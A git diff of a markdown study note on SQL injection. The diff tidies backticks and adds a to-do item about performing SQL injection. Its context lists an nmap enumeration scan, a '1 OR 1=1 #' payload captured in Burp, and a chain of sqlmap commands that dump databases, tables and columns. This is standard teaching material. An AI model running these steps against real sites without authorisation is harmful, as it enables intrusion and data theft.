@@ -58,7 +58,7 @@ SQL injection is a technique used to take advantage of un-sanitized input vulner
 ## Exploit the web application (page_id)
 1. nmap -sV --script=http-enum [target domain or IP address]
 2. Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap. 
-3. Now open the burp and check the input parameters and intercept on then type some as`` `` “1 OR ANY TEXT”`` you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
+3. Now open the burp and check the input parameters and intercept on then type some as`` “1 OR ANY TEXT”`` you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
 4.  ``sqlmap -r <txt file from burpsuite> --dbs`` 
 5.    `` sqlmap -r <txt file from burpsuite> -D <database name> --tables``
 6. ``sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns``
@@ -67,5 +67,5 @@ SQL injection is a technique used to take advantage of un-sanitized input vulner
 
 - [ ]  make notes for using AI sql  
       
-
+- [ ]  perform sql injection 
 ### References
